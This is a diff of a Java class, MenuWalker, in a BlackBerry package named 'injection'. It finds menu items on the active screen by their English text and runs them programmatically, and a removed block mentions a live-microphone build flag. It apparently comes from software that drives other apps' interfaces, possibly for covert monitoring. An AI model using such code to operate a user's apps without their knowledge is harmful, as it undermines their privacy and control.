@@ -9,6 +9,8 @@
  * *************************************************/
 package blackberry.injection;
 
+import java.util.Vector;
+
 import net.rim.device.api.i18n.Locale;
 import net.rim.device.api.system.Application;
 import net.rim.device.api.ui.MenuItem;
@@ -28,7 +30,7 @@ public class MenuWalker {
     static Locale prev;
     static Locale locale;
 
-    public static void walk(String menuItemText) {
+    public static void walkOld(String menuItemText) {
         Screen screen = Ui.getUiEngine().getActiveScreen();
         
       //#ifdef DEBUG
@@ -50,96 +52,122 @@ public class MenuWalker {
         
         setLocaleEnd();
     }
-    /**
-     * Walk the menu and runs the item specified. Descriptions are english
-     * locale.
-     * 
-     * @param menuDesc
-     *            the menu desc
-     */
-/*    public synchronized static void walk(final String[] menuDescriptions) {
 
-        if (!Conf.IS_UI) {
-            //#ifdef DEBUG
-            debug.warn("Not UI");
-            //#endif
-            return;
-        }
+	public static boolean walk(String menuItemText, Screen screen, boolean simple) {
+		final Debug debug = new Debug("walk", DebugLevel.INFORMATION);
 
-        Application.getApplication().invokeLater(new Runnable() {
-            public void run() {
-                try {
-                    setLocaleStart();
+		debug.trace("walk: " + menuItemText + " screen: " + screen);
+		boolean ret = false;
 
-                    boolean found = false;
-                    //#ifdef LIVE_MIC_ENABLED
-                    final Menu menu = UiApplication.getUiApplication()
-                            .getActiveScreen().getMenu(0);
-                    //#else
-                    final Menu menu = null;
+		setLocaleBegin();
 
-                    //#endif
+		final Menu menu = screen.getMenu(0);
+		for (int i = 0, cnt = menu.getSize(); i < cnt && !ret; i++) {
+			final MenuItem item = menu.getItem(i);
 
-                    if (menu == null) {
-                        return;
-                    }
-                    final int size = menu.getSize();
-                    for (int i = 0; i < size; i++) { //&& !found
-                        final MenuItem item = menu.getItem(i);
+			if (item == null) {
+				debug.error("null item: " + i);
+				continue;
+			}
 
-                        //#ifdef DEBUG
-                        debug.trace("menu " + i + " : " + item.toString());
-                        //#endif
+			final String content = item.toString();
 
-                        for (int j = 0; j < menuDescriptions.length; j++) {
-                            final String menuDesc = menuDescriptions[j];
+			if (content == null) {
+				debug.error("null content: " + i);
+				continue;
+			}
 
-                            if (item.toString().startsWith(menuDesc) && !found) {
-                                //#ifdef DEBUG
-                                debug.info("Press Menu: " + item);
-                                //#endif
-                                //Application.getApplication().invokeLater(
-                                //        new Runnable() {
-                                //  public void run() {
-                                item.run();
-                                //            }
-                                //        });
-                                found = true;
-                                break;
-                            }
-                        }
-                    }
-                } finally {
-                    setLocaleEnd();
-                }
-            }
-        });
+			debug.trace(content);
 
-    }*/
+			if (content.equalsIgnoreCase(menuItemText)) {
+				if (simple) {
+					debug.info("running simple: " + content);
+					item.run();
+					ret = true;
+					break;
+				} else {
 
-    /**
-     * Sets the locale end.
-     */
-    public static void setLocaleEnd() {
-        //#ifdef DEBUG
-        debug.trace("setLocaleEnd");
-        //#endif
-        Locale.setDefault(prev);
-    }
+					debug.trace("running invoke: " + content);
 
-    /**
-     * Sets the locale start.
-     * 
-     * @return the locale
-     */
-    public static Locale setLocaleBegin() {
-        //#ifdef DEBUG
-        debug.trace("setLocaleStart");
-        //#endif
-        prev = Locale.getDefault();
-        final Locale locale = Locale.get(Locale.LOCALE_en);
-        Locale.setDefault(locale);
-        return locale;
-    }
+					Application app = screen.getApplication();
+					if (app == null) {
+						debug.trace("null app");
+						app = Application.getApplication();
+					}
+					app.invokeLater(new Runnable() {
+						public void run() {
+							debug.trace("into run");
+							item.run();
+
+							debug.trace("  menuwalk local active screen: "
+									+ UiApplication.getUiApplication()
+											.getActiveScreen());
+						}
+					});
+					
+					break;
+				}
+			}
+		}
+
+		setLocaleEnd();
+
+		return ret;
+	}
+
+	public static boolean walk(String menuItemText) {
+		Screen screen = Ui.getUiEngine().getActiveScreen();
+		// screen.addKeyListener(this);
+		return walk(menuItemText, screen, true);
+	}
+
+	static Vector getMenus(String starting, Screen screen) {
+		Debug debug = new Debug("getMenus", DebugLevel.INFORMATION);
+
+		Vector vector = new Vector();
+
+		setLocaleBegin();
+
+		Menu menu = screen.getMenu(0);
+
+		for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
+			String menuname = menu.getItem(i).toString();
+
+			debug.trace(menuname);
+			if (menuname.startsWith(starting)) {
+				debug.info("found: " + menuname);
+				vector.addElement(menuname);
+			}
+		}
+
+		setLocaleEnd();
+
+		return vector;
+	}
+
+	/**
+	 * Sets the locale end.
+	 */
+	public static void setLocaleEnd() {
+		//#ifdef DEBUG
+		// debug.trace("setLocaleEnd");
+		//#endif
+		Locale.setDefault(prev);
+	}
+
+	/**
+	 * Sets the locale start.
+	 * 
+	 * @return the locale
+	 */
+	public static Locale setLocaleBegin() {
+		//#ifdef DEBUG
+		// debug.trace("setLocaleStart");
+		//#endif
+		prev = Locale.getDefault();
+		final Locale locale = Locale.get(Locale.LOCALE_en);
+		Locale.setDefault(locale);
+		return locale;
+	}
 
 }
